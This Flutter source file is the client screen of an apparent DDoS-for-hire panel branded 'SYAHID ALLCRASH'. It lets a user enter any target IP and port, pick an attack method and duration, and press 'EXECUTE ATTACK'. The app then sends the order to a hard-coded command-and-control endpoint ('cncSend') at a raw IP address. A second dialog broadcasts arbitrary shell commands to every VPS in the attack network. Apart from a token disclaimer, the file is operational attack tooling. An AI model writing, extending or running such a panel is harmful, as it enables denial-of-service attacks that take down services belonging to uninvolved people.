import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'manage_server.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:video_player/video_player.dart';
import 'dart:ui';

// ═══════════════════════════════════════════════════════════════════════════
// THEME CONSTANTS — Synchronized with SYAHID ALLCRASH Design System
// ═══════════════════════════════════════════════════════════════════════════
class _C {
  static const bg = Color(0xFF0c0d15);
  static const bg2 = Color(0xFF11121c);
  static const surface = Color(0xFF161823);
  static const card = Color(0xFF1a1c29);
  static const accent = Color(0xFFe8184a);
  static const accent2 = Color(0xFFff4466);
  static const accent3 = Color(0xFFff8099);
  static const text = Color(0xFFE2EAE5);
  static const muted = Color(0x73E2EAE5);
  static const muted2 = Color(0x38E2EAE5);
  static const border = Color(0x1AE8184A);
  static const border2 = Color(0x0FFFFFFF);
  static const gold = Color(0xFFFFD447);
  static const green = Color(0xFF2BE67A);
  static const danger = Color(0xFFFF4D6D);
  static const orange = Color(0xFFFF8C00);
}

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDDoS;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDDoS,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel>
    with TickerProviderStateMixin {
  // Controllers
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final commandController = TextEditingController();

  // Video Controller
  VideoPlayerController? _videoController;

  // Constants
  static const String baseUrl = "http://104.207.64.203:2001/api/vps";

  // State variables
  late AnimationController _glowController;
  late Animation<double> _glowAnimation;
  late AnimationController _pulseController;
  late Animation<double> _pulseAnimation;
  String selectedDoosId = "";
  double attackDuration = 60;
  bool isExecuting = false;
  bool isCommandExecuting = false;
  bool _isSpeedDialOpen = false;

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _setDefaultDoos();
    _initVideoBackground();
  }

  Future<void> _initVideoBackground() async {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
        ..initialize()
            .then((_) {
              _videoController?.setLooping(true);
              _videoController?.setVolume(0.0);
              _videoController?.play();
              if (mounted) setState(() {});
            })
            .catchError((e) {
              debugPrint("Gagal memuat video background: $e");
            });
    } catch (e) {
      debugPrint("Exception saat memuat video: $e");
    }
  }

  // ── Background ──────────────────────────────────────────────────────────

  Widget _buildAnimatedBackground() {
    return Stack(
      children: [
        if (_videoController != null && _videoController!.value.isInitialized)
          SizedBox.expand(
            child: FittedBox(
              fit: BoxFit.cover,
              child: SizedBox(
                width: _videoController!.value.size.width,
                height: _videoController!.value.size.height,
                child: VideoPlayer(_videoController!),
              ),
            ),
          )
        else
          Container(color: const Color(0xFF0F1A15)),
        BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
          child: Container(color: Colors.black.withOpacity(0.6)),
        ),
      ],
    );
  }

  // ── Animations ──────────────────────────────────────────────────────────

  void _initializeAnimations() {
    _glowController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1800),
    )..repeat(reverse: true);

    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
    );

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1800),
    )..repeat(reverse: true);

    _pulseAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
    );
  }

  void _setDefaultDoos() {
    if (widget.listDDoS.isNotEmpty) {
      selectedDoosId = widget.listDDoS[0]['ddos_id'];
    }
  }

  void _toggleSpeedDial() {
    setState(() {
      _isSpeedDialOpen = !_isSpeedDialOpen;
    });
  }

  // ── API Logic ────────────────────────────────────────────────────────────

  Future<void> _sendDoos() async {
    if (isExecuting) return;
    setState(() => isExecuting = true);

    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (!_validateInputs(target, port)) {
      setState(() => isExecuting = false);
      return;
    }

    try {
      final uri = Uri.parse(
        "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration",
      );
      final res = await http.get(uri);
      final data = jsonDecode(res.body);
      _handleResponse(data, target);
    } catch (_) {
      _showAlert("Error", "An unexpected error occurred. Please try again.");
    } finally {
      setState(() => isExecuting = false);
    }
  }

  Future<void> _sendCommand() async {
    if (isCommandExecuting) return;
    final command = commandController.text.trim();

    if (command.isEmpty) {
      _showAlert("Error", "Command cannot be empty.");
      return;
    }

    setState(() => isCommandExecuting = true);

    try {
      final uri = Uri.parse("$baseUrl/sendCommand");
      final res = await http.post(
        uri,
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"key": widget.sessionKey, "command": command}),
      );
      final data = jsonDecode(res.body);

      if (data["success"] == true) {
        Navigator.pop(context);
        _showNotification("Command sent successfully!");
        _showAlert(
          "Success",
          "Command has been successfully sent to all your VPS servers.",
        );
      } else {
        _showAlert("Failed", data["error"] ?? "Failed to send command.");
      }
    } catch (_) {
      _showAlert("Error", "An unexpected error occurred. Please try again.");
    } finally {
      setState(() => isCommandExecuting = false);
    }
  }

  bool _validateInputs(String target, String port) {
    if (target.isEmpty || widget.sessionKey.isEmpty) {
      _showAlert("Invalid Input", "Target IP cannot be empty.");
      return false;
    }

    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    if (!isIcmp && (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("Invalid Port", "Please input a valid port.");
      return false;
    }
    return true;
  }

  void _handleResponse(Map<String, dynamic> data, String target) {
    if (data["success"] == true) {
      _showAlert("Success", "Attack has been successfully sent to $target.");
    } else if (data["error"] != null) {
      _showAlert("Error", data["error"]);
    } else {
      _showAlert("Unknown", "Unknown response from server.");
    }
  }

  // ── Notification & Alert ────────────────────────────────────────────────

  void _showNotification(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            const Icon(Icons.check_circle, color: _C.green, size: 18),
            const SizedBox(width: 10),
            Expanded(
              child: Text(
                message,
                style: const TextStyle(
                  color: _C.text,
                  fontFamily: 'ShareTechMono',
                  fontSize: 13,
                ),
              ),
            ),
          ],
        ),
        backgroundColor: _C.card,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(10),
          side: BorderSide(color: _C.green.withOpacity(0.3)),
        ),
        duration: const Duration(seconds: 3),
      ),
    );
  }

  void _showAlert(String title, String msg) {
    final bool isSuccess = title == "Success";
    final Color alertColor = isSuccess ? _C.green : _C.accent;

    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _C.surface.withOpacity(0.98),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _C.accent.withOpacity(0.5), width: 1),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: alertColor.withOpacity(0.12),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: alertColor.withOpacity(0.25)),
              ),
              child: Icon(
                isSuccess ? Icons.check_circle : Icons.warning_amber_rounded,
                color: alertColor,
                size: 20,
              ),
            ),
            const SizedBox(width: 12),
            Text(
              title,
              style: TextStyle(
                color: alertColor,
                fontWeight: FontWeight.bold,
                fontFamily: 'MADEEvolveSansEVO',
                fontSize: 14,
                letterSpacing: 1,
              ),
            ),
          ],
        ),
        content: Text(
          msg,
          style: const TextStyle(
            color: _C.muted,
            fontFamily: 'ShareTechMono',
            fontSize: 13,
            height: 1.6,
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
              decoration: BoxDecoration(
                color: alertColor.withOpacity(0.12),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: alertColor.withOpacity(0.3)),
              ),
              child: Text(
                "CLOSE",
                style: TextStyle(
                  color: alertColor,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'MADEEvolveSansEVO',
                  fontSize: 11,
                  letterSpacing: 1,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  void _showCommandDialog() {
    commandController.clear();
    _toggleSpeedDial();
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.all(20),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(20),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 30, sigmaY: 30),
            child: Container(
              padding: const EdgeInsets.all(24),
              decoration: BoxDecoration(
                color: const Color(0xB80E0E18),
                borderRadius: BorderRadius.circular(20),
                border: Border(
                  bottom: BorderSide(color: _C.accent.withOpacity(0.12)),
                  top: BorderSide(color: Colors.white.withOpacity(0.06)),
                  left: BorderSide(color: Colors.white.withOpacity(0.03)),
                  right: BorderSide(color: Colors.white.withOpacity(0.03)),
                ),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.35),
                    blurRadius: 40,
                    offset: const Offset(0, -4),
                  ),
                  BoxShadow(
                    color: _C.accent.withOpacity(0.03),
                    blurRadius: 60,
                    spreadRadius: -20,
                  ),
                ],
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  // Dialog Header
                  Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(12),
                        decoration: BoxDecoration(
                          color: _C.accent.withOpacity(0.12),
                          borderRadius: BorderRadius.circular(14),
                          border: Border.all(
                            color: _C.accent.withOpacity(0.25),
                          ),
                        ),
                        child: const Icon(
                          FontAwesomeIcons.terminal,
                          color: _C.accent,
                          size: 22,
                        ),
                      ),
                      const SizedBox(width: 14),
                      const Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              "EXECUTE COMMAND",
                              style: TextStyle(
                                color: _C.text,
                                fontSize: 16,
                                fontWeight: FontWeight.bold,
                                fontFamily: 'MADEEvolveSansEVO',
                                letterSpacing: 1.5,
                              ),
                            ),
                            SizedBox(height: 3),
                            Text(
                              "Run on all VPS servers",
                              style: TextStyle(
                                color: _C.muted2,
                                fontSize: 10,
                                fontFamily: 'ShareTechMono',
                                letterSpacing: 1,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 20),
                  // Command Input
                  Container(
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.04),
                      borderRadius: BorderRadius.circular(14),
                      border: Border.all(color: _C.accent.withOpacity(0.12)),
                    ),
                    padding: const EdgeInsets.fromLTRB(14, 3, 3, 3),
                    child: TextField(
                      controller: commandController,
                      style: const TextStyle(
                        color: _C.text,
                        fontFamily: 'ShareTechMono',
                        fontSize: 13,
                        letterSpacing: 0.5,
                      ),
                      cursorColor: _C.accent,
                      maxLines: 4,
                      decoration: InputDecoration(
                        hintText: "apt update && apt upgrade -y",
                        hintStyle: TextStyle(
                          color: _C.muted2,
                          fontFamily: 'ShareTechMono',
                          fontSize: 13,
                        ),
                        border: InputBorder.none,
                        contentPadding: const EdgeInsets.symmetric(
                          vertical: 14,
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(height: 24),
                  // Dialog Actions
                  Row(
                    mainAxisAlignment: MainAxisAlignment.end,
                    children: [
                      GestureDetector(
                        onTap: isCommandExecuting
                            ? null
                            : () => Navigator.pop(context),
                        child: Container(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 20,
                            vertical: 12,
                          ),
                          decoration: BoxDecoration(
                            color: Colors.white.withOpacity(0.035),
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(
                              color: Colors.white.withOpacity(0.06),
                            ),
                          ),
                          child: const Text(
                            "CANCEL",
                            style: TextStyle(
                              color: _C.muted,
                              fontFamily: 'MADEEvolveSansEVO',
                              fontSize: 11,
                              letterSpacing: 1,
                            ),
                          ),
                        ),
                      ),
                      const SizedBox(width: 12),
                      GestureDetector(
                        onTap: isCommandExecuting ? null : _sendCommand,
                        child: Container(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 24,
                            vertical: 12,
                          ),
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(12),
                            gradient: const LinearGradient(
                              begin: Alignment.topLeft,
                              end: Alignment.bottomRight,
                              colors: [_C.accent, _C.accent2],
                            ),
                            boxShadow: [
                              BoxShadow(
                                color: _C.accent.withOpacity(0.25),
                                blurRadius: 12,
                              ),
                            ],
                          ),
                          child: isCommandExecuting
                              ? const SizedBox(
                                  width: 18,
                                  height: 18,
                                  child: CircularProgressIndicator(
                                    color: Colors.white,
                                    strokeWidth: 2,
                                  ),
                                )
                              : const Text(
                                  "SEND COMMAND",
                                  style: TextStyle(
                                    color: Colors.white,
                                    fontWeight: FontWeight.bold,
                                    fontFamily: 'MADEEvolveSansEVO',
                                    fontSize: 11,
                                    letterSpacing: 1.5,
                                  ),
                                ),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  void _navigateToManageServer() {
    _toggleSpeedDial();
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => ManageServerPage(sessionKey: widget.sessionKey),
      ),
    );
  }

  // ── Header ──────────────────────────────────────────────────────────────

  Widget _buildHeader() {
    return Container(
      margin: const EdgeInsets.fromLTRB(20, 16, 20, 0),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.5),
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _C.accent.withOpacity(0.3), width: 1),
        boxShadow: [
          BoxShadow(
            color: _C.accent.withOpacity(0.08),
            blurRadius: 20,
            spreadRadius: 1,
          ),
        ],
      ),
      child: Row(
        children: [
          // Back button
          GestureDetector(
            onTap: () => Navigator.of(context).pop(),
            child: Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.05),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.white.withOpacity(0.1)),
              ),
              child: const Icon(
                Icons.arrow_back_ios_new_rounded,
                color: _C.muted,
                size: 15,
              ),
            ),
          ),
          const SizedBox(width: 14),
          // Icon
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: _C.accent.withOpacity(0.12),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: _C.accent.withOpacity(0.25)),
            ),
            child: const Icon(
              FontAwesomeIcons.shieldHalved,
              color: _C.accent,
              size: 20,
            ),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text(
                  "DDoS PANEL",
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 18,
                    fontWeight: FontWeight.bold,
                    fontFamily: "MADEEvolveSansEVO",
                    letterSpacing: 2,
                  ),
                ),
                const SizedBox(height: 3),
                Text(
                  "Attack Configuration & Execution",
                  style: TextStyle(
                    color: _C.accent3.withOpacity(0.6),
                    fontSize: 10,
                    fontFamily: "ShareTechMono",
                    letterSpacing: 1.5,
                  ),
                ),
              ],
            ),
          ),
          // Server count badge
          if (widget.listDDoS.isNotEmpty)
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
              decoration: BoxDecoration(
                color: _C.accent.withOpacity(0.12),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: _C.accent.withOpacity(0.25)),
              ),
              child: Row(
                children: [
                  Container(
                    width: 6,
                    height: 6,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: _C.green,
                      boxShadow: [
                        BoxShadow(
                          color: _C.green.withOpacity(0.5),
                          blurRadius: 4,
                          spreadRadius: 1,
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(width: 6),
                  Text(
                    "${widget.listDDoS.length} methods",
                    style: const TextStyle(
                      color: _C.accent,
                      fontSize: 9,
                      fontWeight: FontWeight.w600,
                      fontFamily: 'ShareTechMono',
                    ),
                  ),
                ],
              ),
            ),
        ],
      ),
    );
  }

  // ── Glass Card (SYAHID ALLCRASH style) ──────────────────────────────────

  Widget _buildCard({required Widget child}) {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.5),
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _C.accent.withOpacity(0.15), width: 1),
      ),
      child: child,
    );
  }

  // ── Section Header ───────────────────────────────────────────────────────

  Widget _buildSectionHeader(String title, IconData icon) {
    return Row(
      children: [
        Container(
          width: 28,
          height: 28,
          decoration: BoxDecoration(
            color: _C.accent.withOpacity(0.12),
            borderRadius: BorderRadius.circular(8),
            border: Border.all(color: _C.accent.withOpacity(0.25)),
          ),
          child: Icon(icon, color: _C.accent, size: 14),
        ),
        const SizedBox(width: 10),
        Text(
          title,
          style: const TextStyle(
            color: _C.text,
            fontSize: 12,
            fontWeight: FontWeight.bold,
            fontFamily: "MADEEvolveSansEVO",
            letterSpacing: 1.5,
          ),
        ),
      ],
    );
  }

  // ── Input Field ─────────────────────────────────────────────────────────

  Widget _buildInput({
    required IconData icon,
    required String label,
    required String hint,
    required TextEditingController controller,
    bool enabled = true,
  }) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          label,
          style: const TextStyle(
            color: _C.muted,
            fontSize: 9,
            fontFamily: 'ShareTechMono',
            letterSpacing: 2,
          ),
        ),
        const SizedBox(height: 8),
        Container(
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.04),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: _C.accent.withOpacity(0.12)),
          ),
          padding: const EdgeInsets.fromLTRB(14, 3, 3, 3),
          child: TextField(
            controller: controller,
            enabled: enabled,
            style: TextStyle(
              color: enabled ? _C.text : _C.muted2,
              fontFamily: 'ShareTechMono',
              fontSize: 13,
              letterSpacing: 1,
            ),
            cursorColor: _C.accent,
            decoration: InputDecoration(
              hintText: hint,
              hintStyle: TextStyle(
                color: _C.muted2,
                fontFamily: 'ShareTechMono',
                fontSize: 13,
                letterSpacing: 1,
              ),
              prefixIcon: Icon(
                icon,
                color: _C.accent.withOpacity(0.6),
                size: 18,
              ),
              border: InputBorder.none,
              contentPadding: const EdgeInsets.symmetric(vertical: 14),
              disabledBorder: InputBorder.none,
            ),
          ),
        ),
      ],
    );
  }

  // ── Target Section ───────────────────────────────────────────────────────

  Widget _buildTargetSection(bool isIcmp) {
    return _buildCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildSectionHeader(
            "TARGET CONFIGURATION",
            FontAwesomeIcons.crosshairs,
          ),
          const SizedBox(height: 18),
          _buildInput(
            icon: Icons.dns_rounded,
            label: "TARGET IP / HOSTNAME",
            hint: "Enter target IP address",
            controller: targetController,
          ),
          const SizedBox(height: 16),
          _buildInput(
            icon: Icons.settings_ethernet_rounded,
            label: "PORT",
            hint: isIcmp
                ? "ICMP protocol does not use ports"
                : "Enter port number",
            controller: portController,
            enabled: !isIcmp,
          ),
        ],
      ),
    );
  }

  // ── Attack Config Section ────────────────────────────────────────────────

  Widget _buildAttackSection() {
    return _buildCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildSectionHeader("ATTACK CONFIGURATION", FontAwesomeIcons.sliders),
          const SizedBox(height: 18),

          // Duration
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.3),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: _C.border2),
            ),
            child: Column(
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        const Icon(
                          FontAwesomeIcons.clock,
                          color: _C.accent,
                          size: 13,
                        ),
                        const SizedBox(width: 8),
                        const Text(
                          "DURATION",
                          style: TextStyle(
                            color: _C.accent,
                            fontSize: 11,
                            fontWeight: FontWeight.bold,
                            fontFamily: 'MADEEvolveSansEVO',
                            letterSpacing: 1.5,
                          ),
                        ),
                      ],
                    ),
                    Container(
                      padding: const EdgeInsets.symmetric(
                        horizontal: 12,
                        vertical: 4,
                      ),
                      decoration: BoxDecoration(
                        color: _C.accent.withOpacity(0.12),
                        borderRadius: BorderRadius.circular(20),
                        border: Border.all(color: _C.accent.withOpacity(0.2)),
                      ),
                      child: Text(
                        "${attackDuration.toInt()}s (${(attackDuration / 60).toStringAsFixed(1)}m)",
                        style: const TextStyle(
                          color: _C.accent,
                          fontSize: 11,
                          fontWeight: FontWeight.bold,
                          fontFamily: 'ShareTechMono',
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 14),
                SliderTheme(
                  data: SliderTheme.of(context).copyWith(
                    activeTrackColor: _C.accent,
                    inactiveTrackColor: _C.accent.withOpacity(0.15),
                    thumbColor: _C.accent,
                    overlayColor: _C.accent.withOpacity(0.15),
                    thumbShape: const RoundSliderThumbShape(
                      enabledThumbRadius: 9,
                    ),
                    trackHeight: 3,
                  ),
                  child: Slider(
                    value: attackDuration,
                    min: 10,
                    max: 300,
                    divisions: 29,
                    onChanged: (value) {
                      setState(() => attackDuration = value);
                    },
                  ),
                ),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: ["10s", "1m", "2m", "3m", "4m", "5m"]
                      .map(
                        (t) => Text(
                          t,
                          style: const TextStyle(
                            color: _C.muted2,
                            fontSize: 9,
                            fontFamily: 'ShareTechMono',
                          ),
                        ),
                      )
                      .toList(),
                ),
              ],
            ),
          ),
          const SizedBox(height: 16),

          // Method dropdown
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.3),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: _C.border2),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    const Icon(
                      FontAwesomeIcons.skullCrossbones,
                      color: _C.accent,
                      size: 13,
                    ),
                    const SizedBox(width: 8),
                    const Text(
                      "ATTACK METHOD",
                      style: TextStyle(
                        color: _C.accent,
                        fontSize: 11,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'MADEEvolveSansEVO',
                        letterSpacing: 1.5,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 12),
                DropdownButtonHideUnderline(
                  child: DropdownButton<String>(
                    dropdownColor: _C.card,
                    value: selectedDoosId,
                    isExpanded: true,
                    iconEnabledColor: _C.accent,
                    style: const TextStyle(
                      color: _C.text,
                      fontFamily: 'ShareTechMono',
                      fontSize: 13,
                    ),
                    items: widget.listDDoS.map((doos) {
                      final isSelected = selectedDoosId == doos['ddos_id'];
                      return DropdownMenuItem<String>(
                        value: doos['ddos_id'],
                        child: Container(
                          padding: const EdgeInsets.symmetric(vertical: 8),
                          child: Row(
                            children: [
                              Container(
                                padding: const EdgeInsets.all(8),
                                decoration: BoxDecoration(
                                  color: isSelected
                                      ? _C.accent.withOpacity(0.15)
                                      : Colors.white.withOpacity(0.04),
                                  borderRadius: BorderRadius.circular(10),
                                  border: Border.all(
                                    color: isSelected
                                        ? _C.accent.withOpacity(0.3)
                                        : _C.border2,
                                  ),
                                ),
                                child: Icon(
                                  FontAwesomeIcons.bolt,
                                  color: isSelected ? _C.accent : _C.muted,
                                  size: 14,
                                ),
                              ),
                              const SizedBox(width: 12),
                              Expanded(
                                child: Text(
                                  doos['ddos_name'] ?? doos['ddos_id'],
                                  style: TextStyle(
                                    color: isSelected ? _C.accent : _C.text,
                                    fontWeight: isSelected
                                        ? FontWeight.bold
                                        : FontWeight.normal,
                                    fontFamily: 'ShareTechMono',
                                  ),
                                ),
                              ),
                              if (isSelected)
                                Container(
                                  padding: const EdgeInsets.symmetric(
                                    horizontal: 8,
                                    vertical: 3,
                                  ),
                                  decoration: BoxDecoration(
                                    color: _C.accent.withOpacity(0.12),
                                    borderRadius: BorderRadius.circular(20),
                                  ),
                                  child: const Text(
                                    "ACTIVE",
                                    style: TextStyle(
                                      color: _C.accent,
                                      fontSize: 8,
                                      fontWeight: FontWeight.bold,
                                      letterSpacing: 1,
                                    ),
                                  ),
                                ),
                            ],
                          ),
                        ),
                      );
                    }).toList(),
                    onChanged: (value) {
                      setState(() => selectedDoosId = value!);
                    },
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ── Execute Button ─────────────────────────────────────────────────────

  Widget _buildExecuteButton() {
    return AnimatedBuilder(
      animation: _pulseAnimation,
      builder: (context, child) {
        final glowOpacity = isExecuting
            ? 0.0
            : 0.15 + _pulseAnimation.value * 0.2;

        return GestureDetector(
          onTap: isExecuting ? null : _sendDoos,
          child: Container(
            width: double.infinity,
            padding: const EdgeInsets.symmetric(vertical: 18),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(16),
              gradient: isExecuting
                  ? const LinearGradient(colors: [_C.surface, _C.card])
                  : const LinearGradient(
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                      colors: [_C.accent, _C.accent2],
                    ),
              boxShadow: [
                BoxShadow(
                  color: _C.accent.withOpacity(glowOpacity),
                  blurRadius: 24,
                  spreadRadius: 1,
                  offset: const Offset(0, 6),
                ),
              ],
            ),
            child: Center(
              child: isExecuting
                  ? const SizedBox(
                      width: 22,
                      height: 22,
                      child: CircularProgressIndicator(
                        color: Colors.white,
                        strokeWidth: 2.5,
                      ),
                    )
                  : const Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(
                          FontAwesomeIcons.play,
                          color: Colors.white,
                          size: 18,
                        ),
                        SizedBox(width: 12),
                        Text(
                          "EXECUTE ATTACK",
                          style: TextStyle(
                            fontSize: 14,
                            fontFamily: 'MADEEvolveSansEVO',
                            fontWeight: FontWeight.bold,
                            letterSpacing: 2.5,
                            color: Colors.white,
                          ),
                        ),
                      ],
                    ),
            ),
          ),
        );
      },
    );
  }

  // ── Disclaimer ───────────────────────────────────────────────────────────

  Widget _buildDisclaimer() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.3),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _C.border2),
      ),
      child: Row(
        children: [
          Icon(
            FontAwesomeIcons.triangleExclamation,
            color: _C.gold.withOpacity(0.6),
            size: 13,
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Text(
              "Use responsibly and in accordance with applicable laws.",
              style: TextStyle(
                color: _C.muted2,
                fontSize: 11,
                fontFamily: 'ShareTechMono',
                letterSpacing: 0.5,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ── Speed Dial ──────────────────────────────────────────────────────────

  Widget _buildSpeedDial() {
    return Column(
      mainAxisSize: MainAxisSize.min,
      crossAxisAlignment: CrossAxisAlignment.end,
      children: [
        if (_isSpeedDialOpen) ...[
          _buildSpeedDialItem(
            icon: Icons.dns_rounded,
            label: "Manage Server",
            onTap: _navigateToManageServer,
            index: 0,
          ),
          const SizedBox(height: 10),
          _buildSpeedDialItem(
            icon: Icons.terminal_rounded,
            label: "Send Command",
            onTap: _showCommandDialog,
            index: 1,
          ),
          const SizedBox(height: 12),
        ],
        // Main FAB
        GestureDetector(
          onTap: _toggleSpeedDial,
          child: Container(
            width: 52,
            height: 52,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: const LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [_C.accent, _C.accent2],
              ),
              boxShadow: [
                BoxShadow(color: _C.accent.withOpacity(0.3), blurRadius: 16),
              ],
              border: Border.all(
                color: Colors.white.withOpacity(0.1),
                width: 1.5,
              ),
            ),
            child: Icon(
              _isSpeedDialOpen ? Icons.close_rounded : Icons.add_rounded,
              color: Colors.white,
              size: 26,
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildSpeedDialItem({
    required IconData icon,
    required String label,
    required VoidCallback onTap,
    required int index,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.7),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _C.accent.withOpacity(0.25)),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, color: _C.accent, size: 16),
            const SizedBox(width: 8),
            Text(
              label,
              style: const TextStyle(
                color: _C.text,
                fontSize: 11,
                fontWeight: FontWeight.w600,
                fontFamily: 'ShareTechMono',
                letterSpacing: 0.5,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ── Footer ────────────────────────────────────────────────────────────

  Widget _buildFooter() {
    return Column(
      children: [
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 6,
              height: 6,
              decoration: BoxDecoration(
                color: _C.green,
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(
                    color: _C.green.withOpacity(0.5),
                    blurRadius: 6,
                    spreadRadius: 1,
                  ),
                ],
              ),
            ),
            const SizedBox(width: 8),
            const Text(
              "SECURE CONNECTION",
              style: TextStyle(
                color: _C.muted2,
                fontSize: 9,
                fontWeight: FontWeight.bold,
                letterSpacing: 1.5,
                fontFamily: 'MADEEvolveSansEVO',
              ),
            ),
            const SizedBox(width: 14),
            Icon(Icons.fingerprint, color: _C.muted2, size: 14),
          ],
        ),
        const SizedBox(height: 8),
        Text(
          "SYAHID ALLCRASH • ENCRYPTED",
          style: TextStyle(
            color: _C.muted2.withOpacity(0.6),
            fontSize: 8,
            fontFamily: 'ShareTechMono',
            letterSpacing: 2,
          ),
        ),
      ],
    );
  }

